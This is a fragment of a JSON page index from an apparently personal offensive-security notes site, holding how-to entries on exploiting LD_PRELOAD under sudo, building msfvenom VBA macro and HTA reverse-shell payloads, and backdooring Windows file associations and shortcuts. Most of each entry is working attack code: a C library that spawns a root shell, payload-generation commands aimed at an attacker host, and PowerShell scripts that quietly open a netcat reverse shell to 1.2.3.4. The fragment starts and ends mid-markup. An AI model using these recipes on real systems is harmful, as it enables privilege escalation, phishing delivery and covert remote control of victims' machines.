class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Not every UNIX-like system calls their library path &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt;!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Exploit-LD_PRELOAD":{"slug":"spells/Exploit-LD_PRELOAD","filePath":"spells/Exploit LD_PRELOAD.md","title":"Exploit LD_PRELOAD","links":["spells/sudo"],"tags":["HowTo","OS/Linux","Application/sudo","AttackCycle/Exploitation"],"content":"If LD_PRELOAD is preserved by sudo, then it’s possible to use a malicious dynamic library to gain root access — just run sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd. Preserved environment variables are listed by “sudo -l”.\nA simple malicious library (perhaps the simplest) that can exploit the LD_PRELOAD trick is:\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n \nvoid _init() {\n\tunsetenv(&quot;LD_PRELOAD&quot;);\n\tsetresuid(0,0,0);\n\tsystem(&quot;/bin/bash -p&quot;);\n}\nCompile with:\ngcc -fPIC -shared -nostartfiles \\\n    -o /path/to/malicious.so /path/to/malicious.c","richContent":"&lt;p&gt;If &lt;code&gt;LD_PRELOAD&lt;/code&gt; is preserved by &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;, then it’s possible to use a malicious dynamic library to gain root access — just run &lt;code&gt;sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd&lt;/code&gt;. &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;Preserved environment variables are listed by “sudo -l”.&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;A simple malicious library (perhaps &lt;em&gt;the&lt;/em&gt; simplest) that can exploit the &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick is:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdio.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;sys/types.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdlib.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;void&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; _init&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tunsetenv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsetresuid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Compile with:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gcc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -fPIC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -shared&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nostartfiles&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;    -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/malicious.so&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/malicious.c&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Exploit-VBA-scripts-with-msfvenom":{"slug":"spells/Exploit-VBA-scripts-with-msfvenom","filePath":"spells/Exploit VBA scripts with msfvenom.md","title":"Exploit VBA scripts with msfvenom","links":["spells/msfvenom","spells/meterpreter"],"tags":["HowTo","Application/Metasploit/msfvenom","Language/VisualBasic","Application/Metasploit/meterpreter","Application/Excel","Application/Word","OS/Windows/WSH"],"content":"Metasploit’s msfvenom can create VBA payloads, as one might expect. Despite WSH not wanting to pop cmd.exe or other executables (outside of calc.exe), a meterpreter reverse shell actually works! (That said, it will die when Word does, and thus needs to be migrated to a new process ASAP…)\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f vba -o ${NAME}.vba\nTo work, the VBA output must be copied into a Microsoft Office document as a macro. By default msfvenom will use the Workbook_Open() function; this is suitable for Excel, but must be changed to Document_Open() for Word.","richContent":"&lt;p&gt;Metasploit’s &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; can create VBA payloads, as one might expect. Despite WSH not wanting to pop cmd.exe or other executables (outside of calc.exe), a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; reverse shell actually works! (That said, it will die when Word does, and thus needs to be migrated to a new process ASAP…)&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vba&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.vba&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;To work, the VBA output must be copied into a Microsoft Office document as a macro. By default &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; will use the &lt;code&gt;Workbook_Open()&lt;/code&gt; function; this is suitable for Excel, but must be changed to &lt;code&gt;Document_Open()&lt;/code&gt; for Word.&lt;/p&gt;"},"spells/Exploit-Windows-HTML-applications-with-msfvenom":{"slug":"spells/Exploit-Windows-HTML-applications-with-msfvenom","filePath":"spells/Exploit Windows HTML applications with msfvenom.md","title":"Exploit Windows HTML applications with msfvenom","links":["spells/msfvenom","spells/netcat"],"tags":["FileFormat/HTA","FileFormat/HTML","Application/Metasploit/msfvenom","AttackCycle/Exploitation","HowTo","Application/netcat","Application/Metasploit"],"content":"msfvenom can be used to generate HTA refer shells.\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f hta-psh -o ${NAME}.hta\nCatch with the standard nc -lvp $ATTACKER_PORT netcat command.\nMetasploit can do all of this automatically for us via exploit/windows/misc/hta_server. Critical variables to set:\n\nLHOST — the host IP address to connect back to\nLPORT — the port to connect back to\nSRVHOST — the host IP address to serve the malicious file on\npayload — the Metasploit payload to use\n\nIn quick-and-dirty cases LHOST and SRVHOST will be the same, though in more sophisticated operations (i.e., if you’re separating phishing and C2 IPs) they will be different. The payload variable is particularly useful, as you can use something like windows/meterpreter/reverse_tcp and get a meterpreter shell, rather than just a plain reverse shell!\nNote that you may have to hit “Return” once the file is served to get back to the Metasploit prompt.","richContent":"&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; can be used to generate HTA refer shells.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/x64/shell_reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; hta-psh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.hta&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Catch with the standard &lt;code&gt;nc -lvp $ATTACKER_PORT&lt;/code&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; command.&lt;/p&gt;\n&lt;p&gt;Metasploit can do all of this automatically for us via &lt;code&gt;exploit/windows/misc/hta_server&lt;/code&gt;. Critical variables to set:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;LHOST&lt;/code&gt; — the host IP address to connect back to&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;LPORT&lt;/code&gt; — the port to connect back to&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;SRVHOST&lt;/code&gt; — the host IP address to serve the malicious file on&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;payload&lt;/code&gt; — the Metasploit payload to use&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;In quick-and-dirty cases LHOST and SRVHOST will be the same, though in more sophisticated operations (i.e., if you’re separating phishing and C2 IPs) they will be different. The payload variable is particularly useful, as you can use something like &lt;code&gt;windows/meterpreter/reverse_tcp&lt;/code&gt; and get a meterpreter shell, rather than just a plain reverse shell!&lt;/p&gt;\n&lt;p&gt;Note that you may have to hit “Return” once the file is served to get back to the Metasploit prompt.&lt;/p&gt;"},"spells/Exploit-Windows-file-associations":{"slug":"spells/Exploit-Windows-file-associations","filePath":"spells/Exploit Windows file associations.md","title":"Exploit Windows file associations","links":["spells/Exploit-Windows-shortcut-files"],"tags":["HowTo","AttackCycle/Exploitation","OS/Windows/Registry","Application/PowerShell","Application/netcat"],"content":"Hijacking file associations is the same basic idea as hijacking shortcut files. This is a two-step process.\n\nLocate the “programmatic ID” of the extension you wish to hijack under HKLM\\Software\\Classes (this will be the key’s (Default) value).\nThe programmatic ID will also be in HKLM\\Software\\Classes and will have the command path as the (Default) value for its shell\\open\\command key.\n\nNote that the programmatic ID command will probably include the %1 placeholder, which is used to pass in the file path. This requires a slightly different script than is used to backdoor shortcuts:\n# Create a reverse shell (note that netcat is something that\n# the attacker need to provide themselves!)\n#\nStart-Process -NoNewWindow &quot;C:\\Windows\\System32\\nc.exe&quot; `\n\t&quot;-e cmd.exe 1.2.3.4 1337&quot;\n \n# Fire off the application the user is expecting and pass in\n# the supplied file path\n#\nC:\\Windows\\System32\\notepad.exe &quot;$args&quot;\nNote the quoting here, as well as the inclusion of the entire $args array. Most of the documentation I’ve found online suggests using $args[0] as an unquoted argument, but this approach did not work in my testing.","richContent":"&lt;p&gt;Hijacking file associations is the same basic idea as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-shortcut-files&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-shortcut-files&quot;&gt;hijacking shortcut files&lt;/a&gt;. This is a two-step process.&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Locate the “programmatic ID” of the extension you wish to hijack under &lt;code&gt;HKLM\\Software\\Classes&lt;/code&gt; (this will be the key’s &lt;code&gt;(Default)&lt;/code&gt; value).&lt;/li&gt;\n&lt;li&gt;The programmatic ID will &lt;em&gt;also&lt;/em&gt; be in &lt;code&gt;HKLM\\Software\\Classes&lt;/code&gt; and will have the command path as the &lt;code&gt;(Default)&lt;/code&gt; value for its &lt;code&gt;shell\\open\\command&lt;/code&gt; key.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;Note that the programmatic ID command will probably include the &lt;code&gt;%1&lt;/code&gt; placeholder, which is used to pass in the file path. This requires a slightly different script than is used to backdoor shortcuts:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create a reverse shell (note that netcat is something that&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the attacker need to provide themselves!)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Start-Process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;NoNewWindow &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;C:\\Windows\\System32\\nc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-e cmd.exe 1.2.3.4 1337&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Fire off the application the user is expecting and pass in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the supplied file path&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;notepad.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;args&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note the quoting here, as well as the inclusion of the entire &lt;code&gt;$args&lt;/code&gt; array. Most of the documentation I’ve found online suggests using &lt;code&gt;$args[0]&lt;/code&gt; as an &lt;em&gt;unquoted&lt;/em&gt; argument, but this approach did not work in my testing.&lt;/p&gt;"},"spells/Exploit-Windows-services":{"slug":"spells/Exploit-Windows-services","filePath":"spells/Exploit Windows services.md","title":"Exploit Windows services","links":["spells/Exploit-local-Windows-services","spells/Exploit-remote-Windows-services"],"tags":["OS/Windows/Services","AttackCycle/Exploitation","AttackCycle/LateralMovement","HowTo"],"content":"Local services\nTransclude of Exploit-local-Windows-services\nRemote services\nTransclude of Exploit-remote-Windows-services","richContent":"&lt;h2 id=&quot;local-services&quot;&gt;Local services&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#local-services&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-local-Windows-services&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit local Windows services&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-local-Windows-services&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-local-Windows-services&quot;&gt;Transclude of Exploit-local-Windows-services&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;remote-services&quot;&gt;Remote services&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remote-services&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-remote-Windows-services&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit remote Windows services&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-remote-Windows-services&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-remote-Windows-services&quot;&gt;Transclude of Exploit-remote-Windows-services&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Exploit-Windows-shortcut-files":{"slug":"spells/Exploit-Windows-shortcut-files","filePath":"spells/Exploit Windows shortcut files.md","title":"Exploit Windows shortcut files","links":[],"tags":["AttackCycle/Exploitation","HowTo","Application/PowerShell","Application/netcat","OS/Windows"],"content":"Shortcuts can be modified to run a script instead. A simple PowerShell script that fires off one executable and then another might look like:\n# Create a reverse shell (note that netcat is something that\n# the attacker need to provide themselves!)\n#\nStart-Process -NoNewWindow &quot;C:\\Windows\\System32\\nc.exe&quot; `\n\t&quot;-e cmd.exe 1.2.3.4 1337&quot;\n \n# Fire off the application the user is expecting\n#\nC:\\Windows\\System32\\calc.exe\nTo ensure that the script itself doesn’t generate a PowerShell window, it will need to be called like so:\npowershell.exe -WindowStyle hidden C:\\Windows\\System32\\calc.ps1","richContent":"&lt;p&gt;Shortcuts can be modified to run a script instead. A simple PowerShell script that fires off one executable and then another might look like:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span 